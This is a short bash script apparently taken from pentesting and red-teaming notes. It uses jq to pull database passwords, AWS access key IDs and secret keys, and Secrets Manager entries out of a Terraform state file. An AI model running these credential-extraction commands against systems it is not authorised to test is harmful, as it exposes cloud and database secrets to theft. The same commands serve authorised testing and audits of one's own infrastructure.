# scripts and notes for pentesting & redteaming
#!/bin/bash

# Study Terraform statefile that might contain secrets and other valuable information.
terraform state list -state=path/to/terraform.tfstate

# pull out data
cat path/to/terraform.tfstate | jq '.resources[] | select(.name == "mysqldb") | .instances[].attributes | "Database Address: \(.address) || DB Username: \(.username) || DB Password: \(.password)"'
cat path/to/terraform.tfstate | jq -r '.resources[] | select(.type == "aws_iam_access_key") | "AWS ID: \(.instances[].attributes.id) || Secret Key: \(.instances[].attributes.secret)"'
cat path/to/terraform.tfstate | jq '.resources[] | select(.name == "tf_secret") | select(.type == "aws_secretsmanager_secret")'
